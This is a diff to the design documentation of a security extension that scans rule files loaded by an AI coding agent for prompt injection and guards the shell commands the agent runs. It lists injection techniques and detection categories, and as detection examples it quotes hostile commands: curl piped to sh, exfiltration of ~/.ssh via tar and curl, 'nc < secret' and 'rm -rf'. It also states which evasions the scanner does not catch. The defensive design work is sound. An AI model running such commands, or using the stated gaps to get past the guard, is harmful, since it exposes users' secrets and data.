@@ -33,6 +33,14 @@ rule loader.
 rules run. A `block` short-circuits the rule loop — user rules cannot lift it
 (`modify` cannot prefix a blocked command).
 
+**Barrier B is conditional.** The extension is a bridge between pi and the
+user, not a default command enforcer: the action barrier only runs while at
+least one loaded rule file is **not explicitly trusted** (hash-approved) —
+see *Command guard* below. No context files, or all files trusted, means the
+extension never imposes command confirmations. Rule-declared
+`confirm`/`block` actions are the user's own design and stay active
+regardless.
+
 **Why both?** The frontmatter is *executable behavior*: a malicious
 `action: modify` with `prepend: curl … | sh` hijacks tools even if the body is
 clean — so the frontmatter must be scanned as code. The body, by contrast, is
@@ -41,6 +49,28 @@ model will do with injected text, so the action the model actually takes is
 guarded separately at the tool boundary. Barrier A filters content, barrier B
 guards actions; neither depends on the other.
 
+## Command guard — when does the extension impose confirmations?
+
+The security model is **explicit trust of context files**: you review what
+you load. The command guard (barrier B) exists only as a backstop for files
+you have **not** reviewed yet.
+
+- **Armed** ⇔ at least one loaded rule file is absent from the trust store
+  (never hash-approved by you). That covers silent `low`/`none` loads and
+  downloaded/shared files — the manipulation surface.
+- **Disarmed** when every loaded file is trusted, or when no rule file is
+  loaded at all. All-trusted ⇒ the extension imposes **zero** command
+  confirmations.
+- When it arms, a one-time notification explains why, and points to
+  `/nma security` (state: `Command guard: ON/OFF`) and to
+  `/nma trust <file>` — reviewing and approving a file removes it from the
+  untrusted set and relaxes the guard.
+- Approval is per exact content (path + SHA-256): any content change revives
+  the review, and with it the guard.
+- Your own rule files declaring `action: confirm` / `action: block` keep
+  working exactly as written — the guard is the extension's default; the
+  rules are your design.
+
 ## Categories & signals
 
 | Category | What it detects | Finding ids (examples) |
@@ -48,7 +78,7 @@ guards actions; neither depends on the other.
 | `prompt-injection` | instruction override, system-prompt extraction, impersonation (`[SYSTEM]`…), persona hijack, tool manipulation, RAG poisoning | `pi-override`, `pi-system-extract`, `pi-impersonation`, `pi-persona`, `pi-tool-manip`, `pi-rag` |
 | `obfuscation` | zero-width / BIDI characters, homoglyphs, normalization anomalies; base64/hex/URL-encoded blobs (recursive, depth 2); instructions hidden in HTML comments or Markdown link text | `uni-zerowidth`, `uni-bidi`, `obf-base64-cmd`, `obf-<kind>-cmd`, `obf-<kind>`, `md-comment-instr`, `md-link-instr` |
 | `external` | URLs classified by their lexical neighborhood: "download and follow instructions", "read the instructions at …", plain doc URLs (low or nothing) | `ext-exec` (terminal), `ext-instructions-download`, `ext-instructions-read`, `ext-instructions`, `ext-doc` |
-| `command` | shell pipelines as *actions*: download+exec, destructive targets, privilege escalation, persistence, global installs | `cmd-dl-exec` (terminal), `cmd-destructive` (terminal), `cmd-priv-esc`, `cmd-persist`, `cmd-install-global`, `cmd-install` (low) |
+| `command` | shell pipelines as *actions*: download+exec (including file-mediated across `&&`/`;`), base64→shell, interpreter inline eval (`-c`/`-e`/`-p`/`-r`), destructive targets, privilege escalation, persistence, global installs | `cmd-dl-exec` (terminal), `cmd-obf-exec` (terminal), `cmd-interp-eval`, `cmd-destructive` (terminal), `cmd-priv-esc`, `cmd-persist`, `cmd-install-global`, `cmd-install` (low) |
 | `secrets` / `exfiltration` | secret-material paths (`.ssh`, `.env`, `.pem`, `id_rsa`, AWS credentials, `.npmrc`); secret read combined with a network transfer | `cmd-secret-read`, `cmd-secret-exfil` (terminal), `act-secret-path` |
 | `supply-chain` | npm Registry metadata + OSV vulnerabilities on install commands; direct tarball URLs, `git+` deps | `cmd-tarball-url`, `cmd-nonregistry`, `cmd-install-script`, `cmd-install-young`, `cmd-deprecated`, `cmd-osv-vuln` |
 | `tool-hijack` | frontmatter scanned as behavior: `modify`/`tools`/`transform`/`handled`/`confirm` present, tools enabled, network+execution in `modify` commands, generic confirm messages | `th-action-present`, `th-tools`, `th-modify-netexec` (terminal), `th-modify-net`, `th-confirm-generic` |
@@ -73,6 +103,10 @@ Aggregation (`aggregate`, calibrated — the fixture corpus is the gate):
 - otherwise the sum per severity is `Σ round(weight × log2(count + 1))`;
 - final thresholds: **total 0 → `none` · ≤ 4 → `low` · ≤ 12 → `medium` ·
   ≤ 24 → `high` · ≥ 25 → `critical`**.
+- a single **medium**+ finding never aggregates below `medium` — one real
+  signal always prompts. Calibrated consequence: `npm i -g`, a lone `curl`
+  download, or a single quoted attack phrase now confirm instead of loading
+  silently.
 
 The provenance nudge (see below) can raise the level one step. A scan error
 never blocks loading silently: the file is treated as `high` risk and skipped.
@@ -90,13 +124,15 @@ Barrier A (rule files, at load):
 | `critical` | **blocked, never auto-prompted**; notify explains `/nma trust <file>` | blocked, console log |
 | already trusted | loaded silently, whatever the level (path + hash match) | same |
 
-Barrier B (actions):
+Barrier B (actions — only while the command guard is armed, see *Command guard*):
 
 | Level | Behavior |
 | --- | --- |
+| guard disarmed | every action allowed silently — no extension-imposed confirmations |
 | `none` / `low` | allowed silently |
 | `medium` / `high` | confirm with findings; declined → blocked |
 | `critical` | confirm: "Approve this dangerous action anyway? (one-time, never persisted)" |
+| scanner exception | **blocked** (fail-closed, never a silent allow) |
 
 An action approval is **one-time, never persisted** — the next identical
 command is asked again. Without a UI, every confirmation is fail-safe:
@@ -110,9 +146,14 @@ command is asked again. Without a UI, every confirmation is fail-safe:
   `{ sha256, approvedAt, provenance, level }`.
 - Trust = **path + content hash**, never path alone. Any content change makes
   `status()` return `changed` → the approval is invalid → the file is
-  re-scanned and re-decided.
-- Writes are atomic (temp file + rename) with mode `0600`. A corrupt store is
-  reported as a warning and treated as empty — it never crashes a load.
+  re-scanned and re-decided. The hash computed by the gate is re-verified at
+  load time: a file whose content changed between scan and load is rejected
+  (fail-closed), never loaded under a stale approval.
+- Writes are atomic (unique temp file — pid + timestamp — then rename, so two
+  pi sessions never clobber each other's temp) with mode `0600`; a write
+  failure is logged and non-fatal (the in-memory store stays authoritative
+  until the next successful write). A corrupt store is reported as a warning
+  and treated as empty — it never crashes a load.
 - Approval happens automatically when a `medium`/`high` confirm is accepted,
   or explicitly with `/nma trust <file>`. Revoke with `/nma untrust <file>`
   (immediate reload). `/nma security` lists every scanned file with its
@@ -137,7 +178,7 @@ recorded in the trust entry.
 
 ## Network behavior
 
-The core — load scan and action scan — is **100 % offline and synchronous**.
+The core — load scan and action scan — is **fully offline and synchronous**.
 
 Network enrichment (`security/npm.ts`) runs **only** for install commands
 (`npm install/i/ci`, `yarn add`, `bun add`, `pnpm add/install`, `npx`, `pip
@@ -169,15 +210,41 @@ as a tested, ready-to-integrate building block.
   cleverly worded body can still influence the model; the barriers raise the
   cost and catch the mechanical attacks (obfuscation, overrides, download+exec,
   tool hijack).
-- Patterns are simple and bounded — no catastrophic regex, no ReDoS surface in
-  the scanner. (A user's own `match.regex` in a rule is an existing, separate,
-  documented risk.)
+- **Evasion coverage.** Fenced code blocks are scanned — capped at `high` and
+  never auto-critical (a payload in a fence always prompts, a benign example
+  stays silent); zero-width, LRM/RLM, word-joiner and control characters are
+  normalized before signature matching, and a trigger that only matches after
+  normalization is `medium`+; trigger phrases split across line breaks are
+  recombined; at barrier B, base64/hex/URL-decoded content is re-scanned as a
+  command, and `base64 -d` piped to a shell is terminal (`cmd-obf-exec`);
+  interpreter inline eval (`python3 -c`, `node -e`, `php -r`…) is flagged
+  `medium` by default — the payload is opaque, that is the honest cost;
+  `modify.prepend/append` is scanned with the full command scanner;
+  exfiltration via `nc < secret` or `tar | curl @-` is caught.
+- **DoS posture.** Positions are resolved through a precomputed line index
+  (`security/position.ts`, O(log n) per lookup — no quadratic scans); findings
+  per file are capped at 2000 and pushed in a loop (no spread overflow); all
+  regexes are simple, bounded and linear — no catastrophic backtracking.
+  Adversarial perf tests lock this in: 20 000 base64 blobs under 1 s, a
+  300 KB decode-bomb stays bounded without throwing.
+- **Honest limits.** Pure-homoglyph words (all non-ASCII letters) are not
+  flagged — realistic payloads always mix ASCII and are caught; env-var
+  indirection (`DIR=/; rm -rf $DIR`) is not resolved; a user's own
+  `match.regex` is unbounded (ReDoS gated to files that are scanned and
+  approved); the trust store's final rename is last-writer-wins (a lost
+  approval is fail-closed, never fail-open); interpreter payloads stay opaque
+  (flagged `medium` by default, `high` when they contain destructive/network
+  tokens); `--eval` long forms are not covered; file-mediated upload across
+  `;` (`tar czf t.tgz ~/.ssh; curl -F file=@t.tgz URL`) is not covered.
 - **The calibration corpus is the permanent gate** (`security/fixtures/`,
-  74 Markdown files + `expected.json`, including an intentional
-  `false-positives/` set): any scoring change must keep it green. A
-  performance budget test keeps a 100-file load under 300 ms.
-- Fail-safe defaults everywhere: scan error → `high`/skip, never a silent
-  load; no UI → confirm means `block`.
+  75 Markdown files + `expected.json`, including an intentional
+  `false-positives/` set): any scoring change must keep it green — benign ≤
+  `low`, false-positives ≤ `medium`, malicious ≥ `high`. Performance budget
+  tests keep a 100-file load under 300 ms and adversarial inputs bounded
+  (20 000 blobs < 1 s, 300 KB decode-bomb capped).
+- Fail-safe defaults everywhere: scan error at the gate → `high`/skip, never a
+  silent load; no UI → confirm means `block`; a scanner exception at the
+  action barrier **blocks** the action (fail-closed, never a silent allow).
 
 ## Rule sources & attribution
 
